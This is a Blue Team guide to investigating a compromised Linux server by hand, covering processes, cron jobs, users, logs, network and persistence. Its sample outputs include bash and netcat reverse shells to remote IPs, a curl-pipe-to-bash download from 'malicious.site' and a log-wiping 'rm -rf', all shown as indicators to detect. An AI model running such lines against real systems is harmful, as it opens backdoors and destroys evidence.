This guide is designed to help you methodically investigate an incident on a compromised Linux server. More than just a list of commands, it is a sequence of guided steps with key questions that will allow you to detect suspicious activity, identify persistence mechanisms, and apply solid defensive logic, just as a professional Blue Team analyst would.

Learning to perform this investigation manually not only strengthens your analytical skills but also prepares you for real-world scenarios where automated tools may fail, be absent, or even have been tampered with. Additionally, in many restricted environments or during technical certifications, their use may not be allowed. This methodology teaches you to detect patterns, anomalies, and correlations on your own, and to justify each action with solid arguments—something fundamental in forensic and professional cybersecurity contexts.

## Step 1: General System Observation

**Key questions:**
- Is the system responding slower than usual?
- Is it using CPU, RAM, or network resources in a strange way?

### uptime

Shows how long the system has been running and its average load over 1, 5, and 15 minutes.

```bash
uptime
```

**What to look for:** Disproportionate load, which may indicate intensive or malicious looping processes.

### free -h

Displays RAM and swap usage in a human-readable format.

```bash
free -h
```

**What to look for:** Excessive swap usage or little free memory when idle.

### top or htop

Shows active processes sorted by CPU or RAM usage in real time.

```bash
top   # or htop
```
**What to look for:** Processes like python, nc, bash, perl with high CPU usage without justification.

### ip a

Displays network interfaces, IP addresses, and interface status.

```bash
ip a
```
**What to look for:** Unexpected interfaces like tun0, docker0, or IPs that do not belong to your network.

## Step 2: Review Active Processes

An attacker who has gained access to the system will likely run processes to establish control, exfiltrate information, or maintain persistence. Reviewing running processes allows you to detect unusual activity, such as interactive shells, tunnels, remote scripts, or disguised processes. This step is crucial to identify in-memory malware or fileless executions.

**Key questions:**
- Are there processes with strange names or unusual locations?
- Are there processes running as root that shouldn't be?

### ps aux --sort=start_time

Lists all active processes with detailed information: user, CPU usage, memory, start time, command, etc.  
The `--sort=start_time` flag sorts them by start time, so the most recently started processes appear at the end (useful for spotting recent processes).

```bash
ps aux --sort=start_time
```

Suspicious output example:

```bash
root     20312  0.0  0.1  34500  4200 ?        Ss   11:05   0:00 /bin/bash -c bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
nobody   20344  0.0  0.2  19100  5100 ?        S    11:05   0:00 nc -e /bin/bash 192.168.1.5 4444
```

**What to look for:**
- Processes run by `root` that you don't recognize
- Suspicious commands: `nc`, `curl`, `python`, `bash`, `sh`, `perl`
- Processes from odd paths: `/tmp/`, `/dev/shm/`, `/opt/.hidden/`
- Commands that appear truncated or incomplete (could be hiding something)

### pstree -p

Shows a hierarchical tree view of processes. Ideal for seeing **who launched what**, especially if there are child processes started from hidden shells.

```bash
pstree -p
```

Suspicious output example:

```bash
systemd(1)─┬─cron(623)───bash(10233)───python(10260)
           └─sshd(1100)───sshd(2044)───bash(2045)───nc(2046)
```

**What to look for:**
- `cron` or `systemd` launching processes they shouldn't
- Orphan processes (no known parent)
- Branches with unusual scripts like `python`, `bash`, `sh`, `perl` stemming from trusted processes
- Unexpected hierarchies (e.g., `sshd → bash → nc`)

### ps aux | grep -v "[" | less

This command is useful to **focus on user or script processes**, ignoring the “noise” from internal system processes.

```bash
ps aux | grep -v "[" | less
```

- `ps aux`: lists all active system processes, with info about user, CPU/memory usage, start time, and command.  
- `grep -v "["`: filters out lines containing brackets (`[ ]`), typically used by kernel or internal system processes (e.g., `[kthreadd]`).  
- `less`: allows comfortable, paginated navigation of the output.

Suspicious output example:
```bash
student   4383  0.0  0.1  15600  2800 ?    S    11:11   0:00 bash
student   4390  0.0  0.0  12345  1600 ?    S    11:11   0:00 python -c 'import socket,os,pty; s=socket...'
root      4402  0.0  0.0  17800  2100 ?    S    11:11   0:00 sh /tmp/.hidden/backup.sh
```
**What to look for:**
- Processes you don't recognize as part of the OS or your installed tools
- Direct shell executions (`bash`, `sh`) outside interactive sessions
- Use of interpreters like `python`, `perl`, `php` to run scripts from unusual paths
- Presence of proxies, tunnels, or reverse shells (`ssh -R`, `curl`, `wget`, `socat`, `nc`)

## Step 3: Review Scheduled Tasks (cronjobs)

Scheduled tasks can be used by attackers to maintain persistence, run reverse shells, or automate malware.

**Key questions:**
- Are there tasks run by root that I don't recognize?
- Are scripts run from unusual or hidden paths?
- Are there tasks repeating every few minutes without clear justification?
- Does the script or task name look disguised or misleading?

### ls /etc/cron.d/ && cat /etc/cron.d/* && crontab -l

This set of commands helps identify persistently scheduled tasks, both system-wide and per user.

```bash
ls /etc/cron.d/ && cat /etc/cron.d/* && crontab -l
```

- `ls /etc/cron.d/`: lists system-defined cronjobs.  
- `cat /etc/cron.d/*`: shows the contents of cronjobs in that path.  
- `crontab -l`: lists the current user's scheduled tasks.  

Malicious cronjob example:
```bash
*/5 * * * * root bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
```
**What to look for:** Tasks run by `root` every few minutes without clear justification, or scripts with unusual paths like `/tmp`, `/opt/.scripts/`, `.backup`, `.monitor`

### How to know how often a cronjob runs?

A cronjob's syntax has **5 time fields**:

| Field        | Value | Meaning                                   |
|--------------|-------|-------------------------------------------|
| Minute       | `*/5` | Every 5 minutes (00, 05, 10, ..., 55)     |
| Hour         | `*`   | Every hour (00–23)                        |
| Day of month | `*`   | Every day of the month                    |
| Month        | `*`   | Every month                               |
| Day of week  | `*`   | Every day of the week                     |

To verify or visualize it, you can use tools like: [https://crontab.guru](https://crontab.guru). Just copy and paste `*/5 * * * *` and you'll see a clear text explanation.

## Step 4: Review Users and Access

One of the most common persistence methods is creating hidden users or abusing existing accounts with active shells. It's essential to review who is allowed interactive access to the system.

**Key questions:**
- Are there unknown or undocumented accounts?
- Are there users with unusual home directories or shells?
- Has any account been created with a generic name (e.g., backup, test, data, etc.)?
- Are system accounts configured to allow interactive access?

### cat /etc/passwd | grep -v "/usr/sbin/nologin"

Shows system users who **have access to an interactive shell**, excluding system or locked accounts (those using `/usr/sbin/nologin`).

```bash
cat /etc/passwd | grep -v "/usr/sbin/nologin"
```

Suspicious example:
```bash
backup:x:1003:1003::/opt/backup:/bin/bash
sysadmin:x:1010:1010::/var/tmp/sysadmin:/bin/sh
```
**What to look for:**  
- Undocumented or unjustified users (e.g., `backup`, `sysadmin`, `datauser`)  
- Shells other than `/bin/bash` or unusual home directories (like `/var/tmp/`, `/opt/`)

### last -a

Shows the **last logins** to the system, indicating username, terminal, IP address, and session duration.

```bash
last -a
```

Suspicious example:
```bash
admin    pts/0        203.0.113.45     Tue Jun 11 03:24   still logged in
```

**What to look for:**  
- Connections from **public or unknown IPs**
- **Atypical times** that don't match expected system activity

### grep "Failed password" /var/log/auth.log 

Searches for **failed authentication attempts**, usually related to SSH or password-protected services.

```bash
grep "Failed password" /var/log/auth.log
```

Suspicious example:
```bash
Failed password for invalid user admin from 203.0.113.45 port 51190 ssh2
Failed password for root from 203.0.113.12 port 58721 ssh2
```

**What to look for:**  
- **Brute force attacks** from the same IP  
- Attempts to access with **invalid or unknown usernames**

## Step 5: Review System Logs

Log files are vital for reconstructing what happened on a system. They allow you to track access, executed commands, and errors that may have been caused by an attacker. Analyzing key system logs helps you detect anomalous activity, identify remote access, brute force attempts, or unauthorized command execution.

**Key questions:**
- Were there unusual SSH logins?
- Were suspicious commands run or at odd times?
- Were there repeated failed authentication attempts from the same IP?
- Are there gaps in the logs indicating deletion or tampering?

### grep -i "ssh" /var/log/auth.log

Shows log lines related to SSH connections (success and failure).

```bash
grep -i "ssh" /var/log/auth.log
```

Suspicious output example:

```bash
Accepted password for root from 203.0.113.5 port 50100 ssh2
```
**What to look for:**
- Connections from public or unknown IPs
- Activity outside normal hours

### journalctl -xe

Displays critical system events, including failures, access, and service errors.

```bash
journalctl -xe
```

Suspicious output example:

```bash
sshd[1402]: Failed password for invalid user admin from 198.51.100.77 port 41442
```
**What to look for:**
- Services repeatedly failing
- Activity related to sshd, cron, network, bash

### cat ~/.bash_history
Shows the last commands run by the current user in their terminal.

```bash
cat ~/.bash_history
```

Suspicious output example:

```bash
curl http://malicious.site/shell.sh | bash
chmod +x /tmp/cleaner.sh
rm -rf /var/log/*
```
**What to look for:**
- Commands related to network connections (nc, curl, wget, scp)
- Manipulation of logs or sensitive files
- Scripts launched from suspicious locations

## Step 6: Review Network and Firewall

Network traffic and firewall rules can reveal a lot about activity on a compromised system. Attackers often open additional ports, set up outbound tunnels, or modify firewall rules to maintain control or evade detection. Inspecting open ports and active rules is key to detecting suspicious connections or unauthorized outbound traffic.

**Key questions:**
- Are there open ports that shouldn't be?
- Are there suspicious rules in iptables?
- Are there active connections to unrecognized external IPs?

### ss -tuln
Shows open sockets and services listening on TCP/UDP ports.

```bash
ss -tuln
```

Suspicious output example:

```bash
LISTEN  0  5  0.0.0.0:4444  0.0.0.0:*  users:("bash",pid=20312,fd=3)
```
**What to look for:**
- Unusual open ports (e.g., 4444, 8080, 9001)
- Services you shouldn't be exposing (like nc, python3 -m http.server)

### iptables -L -n -v

Lists active firewall rules without resolving DNS names.

```bash
iptables -L -n -v
```

Suspicious output example:
```bash
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0
```
**What to look for:**
- Overly permissive ACCEPT rules
- Lack of rules on publicly exposed servers

## Step 7: Detecting Persistence and Backdoors

Once an attacker compromises a system, they usually leave mechanisms to regain access without exploiting the same vulnerability again. These persistence methods can be scripts that run at startup, fake services, scheduled tasks, or even modified binaries. Detecting them in time is essential to cut off the attacker's access and restore system integrity.

**Key questions:**
- Are there hidden scripts in sensitive directories like `/etc/init.d/`, `/lib/systemd/`, `/opt/`, `/tmp/`?
- Are there new or recently modified services?
- Are there suspicious commands or paths associated with persistent processes?

### ls -la /usr/local/bin/
Shows custom local executables.

```bash
ls -la /usr/local/bin/
```

Suspicious output example:

```bash
-rwxr-xr-x 1 root root  1243 Jun 11 11:05 updater.sh
```
**What to look for:** Scripts or binaries with recent dates, strange names, or executable permissions on suspicious files

### find /opt -type f -iname "*.sh"

Searches for `.sh` scripts in the entire `/opt` directory, commonly used for auxiliary storage.

```bash
find /opt -type f -iname "*.sh"
```

Suspicious output example:
```bash
/opt/.backup/install.sh
/opt/data/cleanup.sh
```
**What to look for:** Scripts with ambiguous or malicious names (check.sh, cleaner.sh, update.sh)

### cat /etc/rc.local

Shows the contents of the rc.local startup script, if enabled.

```bash
cat /etc/rc.local
```

Malicious line example:

```bash
bash -i >& /dev/tcp/192.168.1.50/9001 0>&1
```
**What to look for:** Commands that run scripts at system startup or redirections to external IPs

### systemctl list-units --type=service --state=running

Shows active services managed by `systemd`.

```bash
systemctl list-units --type=service --state=running
```

Suspicious output example:

```bash
logrotate-backup.service loaded active running Backup Service
```
**What to look for:** Services with uncommon or duplicate names, or scripts that shouldn't start with the system

## Step 8: Confirm Findings and Take Action
Document your findings with screenshots or evidence, list what you would remove, block, and reinforce, and if possible, share your findings with a colleague for validation.

**Key questions:**
- Can you explain what's happening?
- Did you identify processes, users, tasks, or connections involved?

**In summary:** This methodology is professional, educational, and applicable to real environments. Tools can help, but the analyst's judgment is irreplaceable.
